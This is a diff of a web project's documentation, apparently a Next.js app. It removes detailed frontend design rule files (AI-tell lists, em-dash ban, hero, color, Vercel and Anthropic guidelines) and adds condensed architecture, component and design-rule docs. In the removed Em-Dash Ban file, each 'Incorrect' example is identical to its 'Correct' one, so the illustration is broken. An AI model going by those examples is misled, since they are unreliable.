-28: - `practitioner` - Independent practitioner work.
-29: 
-30: ---
-31: 
-32: # Current Sources
-33: 
-34: ## Taste Skill v2
-35: 
-36: - Source: Leonxlnx/taste-skill (MIT).
-37: - URL: https://github.com/Leonxlnx/taste-skill.
-38: - Claims: Three dials, Section 14, anti-slop rules, em-dash ban.
-39: - Confidence: high.
-40: 
-41: ## Impeccable
-42: 
-43: - Source: pbakaus/impeccable (Apache-2.0).
-44: - URL: https://github.com/pbakaus/impeccable.
-45: - Claims: 45-rule detector, 23 commands, named anti-slop tells.
-46: - Confidence: high.
-47: 
-48: ## Make Interfaces Feel Better
-49: 
-50: - Source: jakubkrehel/make-interfaces-feel-better.
-51: - URL: https://github.com/jakubkrehel/make-interfaces-feel-better.
-52: - Claims: 16 rule categories, concentric radius, press states, shadow layers.
-53: - Confidence: high.
-54: 
-55: ## Vercel Web Design Guidelines
-56: 
-57: - Source: vercel-labs/web-interface-guidelines (MIT).
-58: - URL: https://github.com/vercel-labs/web-interface-guidelines.
-59: - Claims: 90-110 rules across 16+ categories.
-60: - Confidence: high.
-61: 
-62: ## Anthropic Frontend Design
-63: 
-64: - Source: anthropics/skills (Apache-2.0).
-65: - URL: https://github.com/anthropics/skills.
-66: - Claims: Taste prompting, aesthetic direction, two-pass build-critique.
-67: - Confidence: high.
-68: 
-69: ## UI/UX Pro Max
-70: 
-71: - Source: nextlevelbuilder/ui-ux-pro-max-skill (MIT).
-72: - URL: https://github.com/nextlevelbuilder/ui-ux-pro-max-skill.
-73: - Claims: 67 styles, 161 palettes, 57 font pairs, 99 UX guidelines.
-74: - Confidence: high.
-75: 
-76: ---
-77: 
-78: # Refresh Cadence
-79: 
-80: - On-changelog for skill repos.
-81: - Monthly for rule captures.
-82: - Quarterly for ecosystem coverage.
-83: 
-84: ---
-85: 
-86: # Sources
-87: 
-88: - Gogh source-ledger.json (brainstein/source-ledger@2).
-`````
-
-## File: docs/rules/AI Tells (Forbidden Patterns).md
-`````markdown
- 1: # AI Tells (Forbidden Patterns)
- 2: 
- 3: This document lists UI patterns that signal generic AI-generated output.
- 4: 
- 5: These patterns are banned. If you see them, flag and remove immediately.
- 6: 
- 7: ---
- 8: 
- 9: # Color Tells
-10: 
-11: - Purple-to-blue gradient backgrounds as a default.
-12: - Near-black with acid-green or vermilion accents.
-13: - Warm cream (#F4F1EA) with serif display and terracotta accent.
-14: - Default Tailwind color palette used without customization.
-15: - Multiple accent colors on a single page.
-16: - Random gradient overlays without design justification.
-17: 
-18: ---
-19: 
-20: # Layout Tells
-21: 
-22: - Cards nested inside cards.
-23: - Uniform equal spacing everywhere.
-24: - Perfectly centered hero with no asymmetric element.
-25: - Every section using the same layout family.
-26: - Bento grids with mismatched cell counts.
-27: - Generic "Welcome to Next.js" boilerplate left in production.
-28: - Sections that all look like stacked cards.
-29: 
-30: ---
-31: 
-32: # Typography Tells
-33: 
-34: - Inter used for every project without justification.
-35: - Em-dash (U+2014) or en-dash (U+2013) in visible text.
-36: - No `text-wrap: balance` on headlines.
-37: - No `text-wrap: pretty` on body text.
-38: - Body text exceeding 65ch line length.
-39: - Inconsistent type scale across sections.
-40: 
-41: ---
-42: 
-43: # Interaction Tells
-44: 
-45: - No animation or transition on any interactive element.
-46: - No visible press states on buttons.
-47: - Hit areas smaller than 40x40px.
-48: - Borders used instead of shadows for visual separation.
-49: - Single-layer box-shadow instead of three-layer composition.
-50: - No `prefers-reduced-motion` support.
-51: 
-52: ---
-53: 
-54: # Component Tells
-55: 
-56: - Huge monolithic components.
-57: - Business logic mixed into UI components.
-58: - Database queries inside components.
-59: - Inline styles instead of Tailwind.
-60: - Disabled ESLint or TypeScript rules.
-61: - Unused imports or dead code.
-62: 
-63: ---
-64: 
-65: # Content Tells
-66: 
-67: - Generic placeholder text left in production.
-68: - "Lorem ipsum" or "Your content here."
-69: - Overly verbose hero sections.
-70: - CTAs hidden below the fold.
-71: - Navigation with more than 7 items.
-72: 
-73: ---
-74: 
-75: # How to Use
-76: 
-77: Before shipping any UI, scan against this list.
-78: 
-79: If any tell is found:
-80: 
-81: 1. Identify the root cause.
-82: 2. Apply the fix from `docs/Design Rules.md`.
-83: 3. Document the decision if it conflicts with an existing pattern.
-84: 
-85: ---
-86: 
-87: # Sources
-88: 
-89: Adapted from:
-90: 
-91: - Taste Skill v2 (Leon Lin) - Anti-slop ruleset.
-92: - Impeccable (Paul Bakaus) - 45-rule detector, named anti-slop tells.
-93: - Anthropic frontend-design - Distributional convergence research.
-94: - Vercel web-design-guidelines - Audit layer findings.
-`````
-
-## File: docs/rules/Anthropic Frontend Design Rules.md
-`````markdown
- 1: # Anthropic Frontend Design Rules
- 2: 
- 3: Standards from Anthropic's frontend-design skill for building distinctive, high-quality web interfaces.
- 4: 
- 5: ---
- 6: 
- 7: # Core Principle
- 8: 
- 9: The more aesthetic improvements map to implementable frontend code, the better the output.
-10: 
-11: Design taste is articulable logic, not vibes.
-12: 
-13: ---
-14: 
-15: # Aesthetic Direction
-16: 
-17: Before building, commit to a direction:
+11: | Layer              | Does                                                         | Must NOT                           |
+12: | ------------------ | ------------------------------------------------------------ | ---------------------------------- |
+13: | **UI**             | Render, user interaction, state display                      | Business logic, direct DB access   |
+14: | **Actions/Routes** | Request handling, auth, Zod validation, call services        | Business logic, direct repo access |
+15: | **Services**       | Business rules, workflows, multi-repo coordination           | UI dependency, HTTP details        |
+16: | **Repositories**   | DB queries, CRUD, persistence. Only layer that calls Prisma. | Business logic                     |
+17: | **Database**       | Prisma models, migrations, PostgreSQL on Neon                | App logic                          |
 18: 
-19: - Pick a 4-6 value named hex palette.
-20: - Choose one justified aesthetic risk.
-21: - Define a hero thesis (one sentence that captures the page intent).
-22: - Avoid default palettes: warm cream + serif + terracotta, near-black + acid-green, broadsheet hairline-rule layouts.
-23: 
-24: ---
-25: 
-26: # Process
-27: 
-28: Two-pass build-critique:
-29: 
-30: 1. Build the interface with committed direction.
-31: 2. Critique against the design rules. Revise.
-32: 
-33: Never ship on the first pass.
-34: 
-35: ---
-36: 
-37: # Typography
-38: 
-39: - Use `text-wrap: balance` on headlines.
-40: - Use `text-wrap: pretty` on body text.
-41: - Line length: 45-90 characters (max-w-[65ch]).
-42: - Enable font smoothing: `-webkit-font-smoothing: antialiased`.
-43: - Use `font-variant-numeric: tabular-nums` for numeric data.
-44: 
-45: ---
-46: 
-47: # Restraint and Self-Critique
-48: 
-49: - Every element must earn its place.
-50: - If an element does not serve the hero thesis, remove it.
-51: - Default to more whitespace than feels necessary.
-52: - Add density deliberately, not by default.
-53: - Use fewer borders. Prefer shadows, color contrast, and spacing.
-54: 
-55: ---
-56: 
-57: # Writing in Design
-58: 
-59: - Headlines: max 2 lines.
-60: - Subtext: max 20 words.
-61: - CTA visible without scrolling.
-62: - No em-dashes or en-dashes in visible text.
-63: - Body text should feel conversational, not corporate.
-64: 
-65: ---
-66: 
-67: # Anti-Patterns
-68: 
-69: - Inter for everything without justification.
-70: - Purple-to-blue gradients as default.
-71: - Cards nested in cards.
-72: - Uniform equal spacing everywhere.
-73: - Generic AI-generated layouts.
-74: 
-75: ---
-76: 
-77: # Sources
-78: 
-79: - Anthropic frontend-design skill (Apache-2.0).
-80: - Anthropic blog: "Improving frontend design through Skills" (2025-11-12).
-81: - anthropics/skills repository.
-`````
-
-## File: docs/rules/Dark Mode Protocol.md
-`````markdown
- 1: # Dark Mode Protocol
- 2: 
- 3: Rules for implementing and maintaining dark mode across the project.
- 4: 
- 5: ---
- 6: 
- 7: # Implementation
- 8: 
- 9: - Dark mode uses the `.dark` class on the root element.
-10: - Toggle at the layout level, not per component.
-11: - Persist user preference in localStorage.
-12: - Respect `prefers-color-scheme` as the default.
-13: 
-14: ---
-15: 
-16: # Color Tokens
-17: 
-18: - All colors defined as CSS custom properties in `globals.css`.
-19: - Light and dark variants for each token.
-20: - Use oklch color space for perceptually uniform colors.
-21: - Never hardcode color values in components.
-22: 
-23: ---
-24: 
-25: # Background Rules
-26: 
-27: - Never use pure black (#000) for backgrounds.
-28: - Use dark grays (e.g., oklch(0.15 0.01 250)) for surfaces.
-29: - Layer surfaces with subtle lightness differences.
-30: - Use shadows (white at low opacity) for depth in dark mode.
-31: 
-32: ---
-33: 
-34: # Text Rules
-35: 
-36: - Primary text: near-white, not pure white (#FFF).
-37: - Secondary text: medium gray with sufficient contrast.
-38: - Ensure WCAG AA contrast ratios in both modes.
-39: - Never use color alone to convey meaning.
-40: 
-41: ---
-42: 
-43: # Border and Shadow Rules
-44: 
-45: - Borders: use white at 8-12% opacity in dark mode.
-46: - Shadows: compose from three layers (ambient, key, rim).
-47: - Prefer shadows over borders for visual separation.
-48: - Adjust shadow color for dark mode (use lighter shadows).
-49: 
-50: ---
-51: 
-52: # Component Rules
-53: 
-54: - Every component must work in both themes.
-55: - Test all interactive states (hover, focus, active) in both modes.
-56: - Use `cn()` utility for conditional theme classes.
-57: - Never use `dark:` prefix on every property. Use token-based theming.
-58: 
-59: ---
-60: 
-61: # Image Treatment
-62: 
-63: - Image outlines: 1px at 10% opacity (white in dark mode, black in light mode).
-64: - Avoid bright images on dark backgrounds without subtle containment.
-65: - Use `next/image` with `dark:` variants when needed.
-66: 
-67: ---
-68: 
-69: # Documentation Rules
-70: 
-71: Every significant change should update the relevant documentation.
-72: 
-73: Architecture decisions should be documented before implementation whenever possible.
-74: 
-75: Documentation should always reflect the current state of the project.
-`````
-
-## File: docs/rules/Em-Dash Ban.md
-`````markdown
- 1: # Em-Dash Ban
- 2: 
- 3: The em-dash (U+2014) and en-dash (U+2013) are banned anywhere in visible text.
- 4: 
- 5: ---
- 6: 
- 7: # Rules
- 8: 
- 9: - Never use em-dash (U+2014) in visible text.
-10: - Never use en-dash (U+2013) in visible text.
-11: - Use the hyphen (-) for all dash-like purposes.
-12: - Use the math minus sign only in mathematical expressions.
-13: 
-14: ---
-15: 
-16: # Why
-17: 
-18: This rule comes from the Taste Skill framework (Leon Lin).
-19: 
-20: LLMs default to em-dashes and en-dashes because they appear frequently in training data. Banning them forces more deliberate punctuation and breaks the generic AI writing pattern.
-21: 
-22: ---
-23: 
-24: # Examples
-25: 
-26: Incorrect:
-27: 
-28: ```
-29: The feature supports authentication - including OAuth and magic links.
-30: ```
-31: 
-32: Correct:
-33: 
-34: ```
-35: The feature supports authentication - including OAuth and magic links.
-36: ```
-37: 
-38: Incorrect:
-39: 
-40: ```
-41: Our platform offers three tiers - Basic, Pro, and Enterprise.
-42: ```
-43: 
-44: Correct:
-45: 
-46: ```
-47: Our platform offers three tiers - Basic, Pro, and Enterprise.
-48: ```
-49: 
-50: ---
-51: 
-52: # Enforcement
-53: 
-54: - Check all visible text in components.
-55: - Check markdown documentation (internal only).
-56: - Do not check code comments or string literals that are not rendered.
-57: 
-58: ---
-59: 
-60: # Sources
-61: 
-62: - Taste Skill v2 (Leon Lin) - Em-dash and en-dash ban.
-`````
-
-## File: docs/rules/Hero Discipline.md
-`````markdown
- 1: # Hero Discipline
- 2: 
- 3: Rules for building effective hero sections.
- 4: 
- 5: ---
- 6: 
- 7: # Constraints
- 8: 
- 9: - Headline: max 2 lines.
-10: - Subtext: max 20 words.
-11: - CTA visible without scrolling.
-12: - Top padding: max `pt-24`.
-13: - Max 4 text elements in the hero.
-14: 
-15: ---
-16: 
-17: # Structure
-18: 
-19: A hero section contains:
+19: ## Stack Integration
 20: 
-21: 1. Headline (thesis of the page).
-22: 2. Subtext (supporting the headline).
-23: 3. CTA (primary action).
-24: 4. Optional: secondary action or supporting visual.
+21: - **Next.js 16:** Server Components by default. Client only for state/browser APIs/events. Server Actions for mutations, Route Handlers for APIs, Metadata API for SEO.
+22: - **Prisma + Neon:** serverless PG via `@prisma/adapter-neon`, WebSocket via `ws`, singleton client in `lib/db.ts`. Never instantiate Prisma in components.
+23: - **Zod:** validate all external input. Type inference from schemas. Env validation via `@t3-oss/env-nextjs`.
+24: - **Tailwind v4:** design tokens as CSS custom properties in `globals.css`, oklch color space, dark mode via `.dark` class, `cn()` via `clsx` + `tailwind-merge`.
 25: 
-26: ---
+26: ## Rules
 27: 
-28: # Layout
-29: 
-30: - Hero must be visible above the fold.
-31: - Never hide the CTA below the fold.
-32: - Use `text-wrap: balance` on the headline.
-33: - Use `text-wrap: pretty` on subtext.
-34: - Body text: `max-w-[65ch]`.
-35: 
-36: ---
-37: 
-38: # Anti-Patterns
-39: 
-40: - Hero with more than 4 text elements.
-41: - CTA pushed below the fold by excessive padding.
-42: - Headline that spans more than 2 lines.
-43: - Subtext that exceeds 20 words.
-44: - Hero with no clear visual hierarchy.
-45: - Generic "Welcome to [Framework]" boilerplate.
-46: 
-47: ---
-48: 
-49: # Design Variance
-50: 
-51: - Hero should set the tone for the entire page.
-52: - At least one asymmetric element in the hero.
-53: - Break the grid intentionally.
-54: - Use the three dials to calibrate hero intensity.
-55: 
-56: ---
-57: 
-58: # Sources
-59: 
-60: - Taste Skill v2 (Leon Lin) - Hero constraints and Section 14 pre-flight.
-`````
-
-## File: docs/rules/Taste Skill Color Rules.md
-`````markdown
- 1: # Taste Skill Color Rules
- 2: 
- 3: Color system rules adapted from the Taste Skill framework.
- 4: 
- 5: ---
- 6: 
- 7: # One Accent Per Page
- 8: 
- 9: - Every page has exactly one accent color.
-10: - The accent color is used for CTAs, active states, and highlights.
-11: - Never use multiple accent colors on a single page.
-12: 
-13: ---
-14: 
-15: # Color Palette
-16: 
-17: - Define a 4-6 value named hex palette per project.
-18: - Use oklch color space in `globals.css` for perceptually uniform colors.
-19: - Never use default Tailwind colors without customization.
-20: - Never use purple-to-blue gradients as a default.
-21: 
-22: ---
-23: 
-24: # Banned Palettes
-25: 
-26: - Warm cream (#F4F1EA) with serif display and terracotta accent.
-27: - Near-black with acid-green or vermilion accents.
-28: - Purple-to-blue gradient backgrounds.
-29: - Broad hairline-rule layouts with serif typography.
-30: 
-31: ---
-32: 
-33: # Radius Scale
+28: - Business logic never in UI. DB access never in UI.
+29: - Validate every external input with Zod.
+30: - No `any`. Prefer inferred types.
+31: - Server Components by default. Thin routes; delegate to services.
+32: - Never modify production DBs manually. Use Prisma migrations.
+33: - Never expose secrets, password hashes, or internal identifiers.
 34: 
-35: - One radius scale per page.
-36: - Define in `globals.css` via CSS custom properties.
-37: - Concentric radius formula: outer radius = inner radius + padding.
-38: - Never mix radius scales within a page.
-39: 
-40: ---
-41: 
-42: # Theme Locks
-43: 
-44: - One theme (light or dark) per page.
-45: - Switch themes at the layout level, not per component.
-46: - Test both themes before shipping.
-47: 
-48: ---
-49: 
-50: # Token Usage
-51: 
-52: - Always use design tokens from `globals.css`.
-53: - Never hardcode color values in Tailwind classes.
-54: - Update tokens at the source, not in individual components.
-55: 
-56: ---
-57: 
-58: # Sources
-59: 
-60: - Taste Skill v2 (Leon Lin) - Color/Shape/Page-Theme locks.
-61: - W3C Design Tokens Community Group - First stable specification.
-`````
-
-## File: docs/rules/Vercel Interface Rule Categories.md
-`````markdown
-  1: # Vercel Interface Rule Categories
-  2: 
-  3: Performance and accessibility rules adapted from Vercel's web design guidelines.
-  4: 
-  5: ---
-  6: 
-  7: # Accessibility
-  8: 
-  9: - Icon-only buttons need `aria-label`.
- 10: - Never use `outline-none` without a focus replacement.
- 11: - Never block paste on password or input fields.
- 12: - Honor `prefers-reduced-motion`.
- 13: - Use semantic HTML elements.
- 14: - Ensure color contrast meets WCAG AA.
- 15: 
- 16: ---
- 17: 
- 18: # Focus Management
- 19: 
- 20: - Visible focus rings on all interactive elements.
- 21: - Focus should follow logical tab order.
- 22: - Skip links for keyboard navigation.
- 23: - Focus trapping in modals and dialogs.
- 24: 
- 25: ---
- 26: 
- 27: # Forms
- 28: 
- 29: - Labels associated with inputs.
- 30: - Error messages linked to inputs via `aria-describedby`.
- 31: - Required fields indicated visually and programmatically.
- 32: - Inline validation on blur, not on every keystroke.
- 33: - Never clear form state on accidental navigation.
- 34: 
- 35: ---
- 36: 
- 37: # Animation
- 38: 
- 39: - Always honor `prefers-reduced-motion`.
- 40: - Keep animations under 300ms for micro-interactions.
- 41: - Use `ease-out` for enter, `ease-in` for exit.
- 42: - Virtualize lists over 50 items.
- 43: - Avoid layout-triggering animations (use `transform` and `opacity`).
- 44: 
- 45: ---
- 46: 
- 47: # Typography
- 48: 
- 49: - Use `text-wrap: balance` on headlines.
- 50: - Use `text-wrap: pretty` on body text.
- 51: - Line length: 45-90 characters.
- 52: - Consistent type scale across the application.
- 53: 
- 54: ---
- 55: 
- 56: # Content
- 57: 
- 58: - Use `Intl.DateTimeFormat` for dates.
- 59: - Destructive actions need confirmation or undo.
- 60: - URL should reflect application state.
- 61: - Loading states for all async operations.
- 62: 
- 63: ---
- 64: 
- 65: # Images
- 66: 
- 67: - Explicit `width` and `height` on all images.
- 68: - Use `next/image` for optimized delivery.
- 69: - Alt text on all meaningful images.
- 70: - Decorative images: `alt=""` and `role="presentation"`.
- 71: 
- 72: ---
- 73: 
- 74: # Performance
- 75: 
- 76: - Server Components by default.
- 77: - Lazy load below-the-fold content.
- 78: - Minimize client-side JavaScript.
- 79: - Use streaming and Suspense boundaries.
- 80: - Prefetch critical navigation links.
- 81: 
- 82: ---
- 83: 
- 84: # Touch
- 85: 
- 86: - Minimum 40x40px touch targets.
- 87: - Avoid hover-only interactions on touch devices.
- 88: - Use `@media (hover: hover)` for hover styles.
- 89: - Safe areas for mobile notches.
- 90: 
- 91: ---
- 92: 
- 93: # Dark Mode
- 94: 
- 95: - Use CSS custom properties for theme switching.
- 96: - Test both light and dark modes.
- 97: - Avoid pure black (#000) for backgrounds. Use dark grays.
- 98: - Ensure sufficient contrast in both modes.
- 99: 
-100: ---
-101: 
-102: # Sources
-103: 
-104: - Vercel web-interface-guidelines (MIT).
-105: - Vercel web-design-guidelines agent skill.
-106: - vercel.com/design/guidelines.
-`````
-
-## File: docs/skills/Impeccable Toolchain.md
-`````markdown
- 1: # Impeccable Toolchain
- 2: 
- 3: Automated visual and engineering defect detection for AI-generated frontend code.
- 4: 
- 5: ---
- 6: 
- 7: # Overview
- 8: 
- 9: - 23 commands organized by discipline.
-10: - 45 deterministic anti-pattern rules.
-11: - Runs without an LLM for detection.
-12: - Live iteration mode for HMR-based design.
-13: 
-14: ---
-15: 
-16: # Installation
-17: 
-18: ```bash
-19: npx impeccable install
-20: ```
-21: 
-22: Then inside your AI coding tool:
-23: 
-24: ```
-25: /impeccable init
-26: ```
-27: 
-28: This creates `PRODUCT.md` and optionally `DESIGN.md`.
-29: 
-30: ---
-31: 
-32: # Key Commands
-33: 
-34: | Command                | Purpose                                          |
-35: | ---------------------- | ------------------------------------------------ |
-36: | `/impeccable init`     | Initialize project with PRODUCT.md and DESIGN.md |
-37: | `/impeccable detect`   | Run 45-rule detector                             |
-38: | `/impeccable bolder`   | Respect existing design systems                  |
-39: | `/impeccable critique` | Independent critique mode                        |
-40: 
-41: ---
-42: 
-43: # PRODUCT.md
-44: 
-45: Defines:
-46: 
-47: - Audience and user persona.
-48: - Brand/product lane.
-49: - Voice and tone.
-50: - Anti-references (what NOT to build).
-51: 
-52: ---
-53: 
-54: # DESIGN.md
-55: 
-56: Defines:
-57: 
-58: - Color palette (named hex values).
-59: - Typography scale.
-60: - Component inventory.
-61: - Aesthetic direction.
-62: 
-63: ---
-64: 
-65: # Named Anti-Slop Tells
-66: 
-67: Impeccable flags these patterns:
-68: 
-69: - Inter for everything without justification.
-70: - Purple-to-blue gradients.
-71: - Cards nested in cards.
-72: - Decorative grid backgrounds.
-73: - Two-axis gradient overlay patterns.
-74: 
-75: ---
-76: 
-77: # Detector Rules (45)
-78: 
-79: The detector runs deterministically without an LLM:
-80: 
-81: - Typography violations.
-82: - Color violations.
-83: - Layout violations.
-84: - Interaction violations.
-85: - Performance violations.
-86: - Accessibility violations.
-87: 
-88: ---
-89: 
-90: # Sources
-91: 
-92: - pbakaus/impeccable (Apache-2.0).
-93: - impeccable.style.
-94: - Latest: skill-v3.9.1, cli-v3.2.0 (2026-07-01).
-`````
-
-## File: docs/skills/Make Interfaces Feel Better.md
-`````markdown
- 1: # Make Interfaces Feel Better
- 2: 
- 3: Micro-interaction and visual polish skill by Jakub Krehel.
- 4: 
- 5: ---
- 6: 
- 7: # Overview
- 8: 
- 9: 16 rule categories for improving interface feel through precise micro-interactions, shadows, typography, and animation values.
-10: 
-11: ---
-12: 
-13: # Key Rules
-14: 
-15: ## Concentric Border Radius
-16: 
-17: Outer radius = inner radius + padding.
-18: 
-19: Example: card with 16px padding and 8px inner radius gets 24px outer radius.
-20: 
-21: ## Optical Alignment
-22: 
-23: Elements should appear visually centered, not mathematically centered.
-24: 
-25: Adjust for optical weight (heavier elements shift slightly toward center).
-26: 
-27: ## Shadows Over Borders
-28: 
-29: Compose shadows from three layers:
-30: 
-31: 1. Ambient (diffuse, large spread).
-32: 2. Key (directional, medium spread).
-33: 3. Rim (tight, small spread).
-34: 
-35: Prefer shadows over borders for depth and separation.
+35: ## Data Flow
 36: 
-37: ## Press States
-38: 
-39: Button press feedback: `transform: scale(0.96)`.
-40: 
-41: Never go below `scale(0.95)`.
-42: 
-43: ## Hit Areas
+37: Request → Zod validation → Action/Route → Service → Repository → Prisma → PostgreSQL → back up the stack to Response.
+`````
+
+## File: docs/Components.md
+`````markdown
+ 1: # Components
+ 2: 
+ 3: ## Folder Layout
+ 4: 
+ 5: ```
+ 6: components/
+ 7:   ui/        # shadcn/ui primitives (Button, Input, Card, Dialog, ...)
+ 8:   layout/    # Page structure (Header, Sidebar, Footer, Shell)
+ 9:   shared/    # Composed reusable components (SearchBar, UserMenu, EmptyState)
+10: features/
+11:   <feature>/ # Feature components co-located with feature
+12: ```
+13: 
+14: ## Composition
+15: 
+16: ```
+17: Page → Layout → Feature → Shared → UI
+18: ```
+19: 
+20: ## Principles
+21: 
+22: - Single responsibility, reusable, props-driven, no hidden side effects.
+23: - UI primitives: generic, no business logic.
+24: - Feature components live next to their feature.
+25: 
+26: ## Accessibility (required on all interactive components)
+27: 
+28: Keyboard navigation · visible focus states · screen-reader labels · semantic HTML.
+29: 
+30: ## Styling
+31: 
+32: Tailwind utilities + design tokens from `globals.css`. No custom CSS unless necessary. No inline styles.
+33: 
+34: ## Creation Checklist
+35: 
+36: - [ ] Reuses an existing component if possible
+37: - [ ] Generic and reusable
+38: - [ ] Lives in the right folder (ui / shared / layout / feature)
+39: - [ ] Accessible, responsive, properly typed
+40: - [ ] Follows anti-slop design rules (see `docs/Design Rules.md`)
+41: - [ ] Uses design tokens, not raw colors
+42: - [ ] Intentional spacing, not uniform defaults
+43: - [ ] Shadows over borders for depth
+44: - [ ] Press states and ≥ 40×40 hit areas on interactive elements
+`````
+
+## File: docs/Design Rules.md
+`````markdown
+ 1: # Design Rules
+ 2: 
+ 3: Frontend quality rules that prevent generic AI-generated output. Read before building any UI.
+ 4: 
+ 5: ## The Three Dials (set before layout)
+ 6: 
+ 7: | Dial             | Default | Purpose                                             |
+ 8: | ---------------- | ------- | --------------------------------------------------- |
+ 9: | Design Variance  | 8       | How much layout breaks from generic grids           |
+10: | Motion Intensity | 6       | Animation/transition presence                       |
+11: | Visual Density   | 4       | Information per viewport (raise for data-heavy UIs) |
+12: 
+13: Defaults 8/6/4 work for most landing pages. Commit to a direction before touching layout.
+14: 
+15: ## Color
+16: 
+17: - One accent color, one radius scale, one theme per page.
+18: - Never purple-to-blue gradients by default.
+19: - Use design tokens from `globals.css`. No inventing new color variables.
+20: 
+21: ## Typography
+22: 
+23: - Body: `max-w-[65ch]`, `text-wrap: pretty`.
+24: - Headlines: `text-wrap: balance`.
+25: - Antialiasing on. Tabular nums for numeric data.
+26: - No em-dash (U+2014) or en-dash (U+2013) in visible text. Use hyphens.
+27: - More whitespace than feels necessary; add density deliberately.
+28: - Prefer shadows/contrast over borders for separation.
+29: 
+30: ## Hero
+31: 
+32: - Headline ≤ 2 lines, subtext ≤ 20 words, CTA above the fold, top padding ≤ `pt-24`, max 4 text elements.
+33: 
+34: ## Navigation
+35: 
+36: - Single line at desktop. Height cap 80px (default 64-72). No hamburger on desktop.
+37: 
+38: ## Layout
+39: 
+40: - 8-section page → use ≥ 4 different layout families.
+41: - Bento grids: exactly N cells for N items.
+42: - Never cards-inside-cards.
+43: - Break the grid at least once. Uniform spacing everywhere looks generated.
 44: 
-45: Interactive elements: minimum 40x40px hit area.
+45: ## Micro-Interactions
 46: 
-47: Extend with pseudo-element when the visible element is smaller.
-48: 
-49: ## Font Smoothing
-50: 
-51: Enable: `-webkit-font-smoothing: antialiased`.
-52: 
-53: Use `font-variant-numeric: tabular-nums` for numeric data.
+47: - **Radius:** outer = inner + padding (concentric).
+48: - **Press:** `scale(0.96)`. Never below 0.95.
+49: - **Shadows:** compose from 3 layers (ambient, key, rim). Prefer over borders.
+50: - **Hit areas:** minimum 40×40px (extend with pseudo-element if needed).
+51: - **Animation:** icon `scale 0.25→1, opacity 0→1, blur 4px→0`; stagger ~100ms; enter ~800ms, exit subtler; spring `duration 0.3, bounce 0`.
+52: - Always honor `prefers-reduced-motion`.
+53: - **Image outlines:** `1px` at `10%` opacity (black light / white dark).
 54: 
-55: ## Animation Values
+55: ## Component Checklist
 56: 
-57: - Icon: `scale 0.25 -> 1`, `opacity 0 -> 1`, `blur 4px -> 0`.
-58: - Stagger delay: ~100ms between items.
-59: - Enter duration: ~800ms.
-60: - Exit: subtler than enter.
-61: - Spring settings: `duration 0.3`, `bounce 0`.
-62: 
-63: ## Image Outlines
-64: 
-65: - 1px at 10% opacity.
-66: - Black in light mode, white in dark mode.
+57: - [ ] No generic AI layout (cards-in-cards, uniform grids, centered everything)
+58: - [ ] One accent color, no random gradients
+59: - [ ] Typography uses `balance`/`pretty`
+60: - [ ] Press states visible on interactive elements
+61: - [ ] Shadows are multi-layered
+62: - [ ] Hit areas ≥ 40×40px
+63: - [ ] Animations respect `prefers-reduced-motion`
+64: - [ ] Spacing deliberate, not default
+65: - [ ] Grid broken at least once
+66: - [ ] No em-dashes or en-dashes in visible text
 67: 
-68: ---
+68: ## Anti-Patterns to Flag
 69: 
-70: # Supporting Files
+70: Inter for everything without justification · purple-to-blue gradient backgrounds · cards-in-cards · uniform spacing · perfectly centered hero with no asymmetric element · no animation on any interactive element · borders instead of shadows · default Tailwind palette used raw · leftover "Welcome to Next.js" boilerplate.
 71: 
-72: - `typography.md` - Typography rules.
-73: - `surfaces.md` - Surface and shadow rules.
-74: - `animations.md` - Animation value reference.
-75: - `performance.md` - Performance constraints.
-76: 
-77: ---
-78: 
-79: # Sources
-80: 
-81: - jakubkrehel/make-interfaces-feel-better (no license, all rights reserved).
-82: - jakub.kr/writing/details-that-make-interfaces-feel-better.
-`````
-
-## File: docs/skills/Taste Skill Project.md
-`````markdown
- 1: # Taste Skill Project
- 2: 
- 3: Three-dial aesthetic framework for calibrating AI-generated frontend output.
- 4: 
- 5: ---
- 6: 
- 7: # Overview
- 8: 
- 9: The Taste Skill provides a conversation-driven framework for setting aesthetic direction before building. It prevents generic AI output by committing to a direction early.
-10: 
-11: ---
-12: 
-13: # The Three Dials
-14: 
-15: | Dial             | Default | Scale | Description                                      |
-16: | ---------------- | ------- | ----- | ------------------------------------------------ |
-17: | Design Variance  | 8       | 1-10  | How much the layout breaks from generic patterns |
-18: | Motion Intensity | 6       | 1-10  | How much animation and transition is present     |
-19: | Visual Density   | 4       | 1-10  | How much information per viewport                |
-20: 
-21: Set these dials conversationally before touching layout.
-22: 
-23: ---
-24: 
-25: # Section 14 Pre-Flight Check
-26: 
-27: Mandatory before completing any page:
-28: 
-29: - [ ] Three dials set and committed.
-30: - [ ] Hero follows constraints (2-line headline, 20-word subtext, CTA above fold).
-31: - [ ] Navigation on single line at desktop (80px height cap).
-32: - [ ] One accent color per page.
-33: - [ ] One radius scale per page.
-34: - [ ] One theme per page.
-35: - [ ] At least 4 layout families in 8-section pages.
-36: - [ ] No em-dashes or en-dashes in visible text.
-37: - [ ] No cards nested inside cards.
-38: - [ ] No purple-to-blue gradients.
-39: - [ ] No Inter for everything without justification.
-40: - [ ] Typography uses balance/pretty wrapping.
-41: 
-42: Any failed box blocks completion.
-43: 
-44: ---
-45: 
-46: # Greenfield Workflow
-47: 
-48: 1. Set the three dials.
-49: 2. Pick a 4-6 value named hex palette.
-50: 3. Define the hero thesis.
-51: 4. Build with committed direction.
-52: 5. Run Section 14 pre-flight.
-53: 6. Revise if any check fails.
-54: 
-55: ---
-56: 
-57: # Redesign Workflow
-58: 
-59: 1. Audit existing interface against Section 14.
-60: 2. Identify what to preserve, what to overhaul.
-61: 3. Set the three dials for the new direction.
-62: 4. Build respecting preserved elements.
-63: 5. Run Section 14 pre-flight.
-64: 
-65: ---
-66: 
-67: # Anti-Laziness Rules
-68: 
-69: - Never output a generic layout as a starting point.
-70: - Always commit to a direction before building.
-71: - Always run the pre-flight check.
-72: - Never skip the critique pass.
+72: ## Sources
 73: 
-74: ---
-75: 
-76: # Sources
-77: 
-78: - Leonxlnx/taste-skill (MIT).
-79: - tasteskill.dev.
-80: - v2 is experimental, iterating toward v2.0.0 stable.
+74: Taste Skill · make-interfaces-feel-better · Impeccable · Anthropic frontend-design · ui-ux-pro-max · Vercel web-design-guidelines · Refactoring UI · Butterick's Practical Typography.
 `````
 
-## File: docs/skills/Vercel Web Design Guidelines.md
+## File: docs/Project Context.md
 `````markdown
-  1: # Vercel Web Design Guidelines
-  2: 
-  3: High-performance, accessible web interface rules from Vercel Labs.
-  4: 
-  5: ---
-  6: 
-  7: # Installation
-  8: 
-  9: ```bash
- 10: npx skills add vercel-labs/agent-skills --skill web-design-guidelines
- 11: ```
- 12: 
- 13: ---
- 14: 
- 15: # Workflow
- 16: 
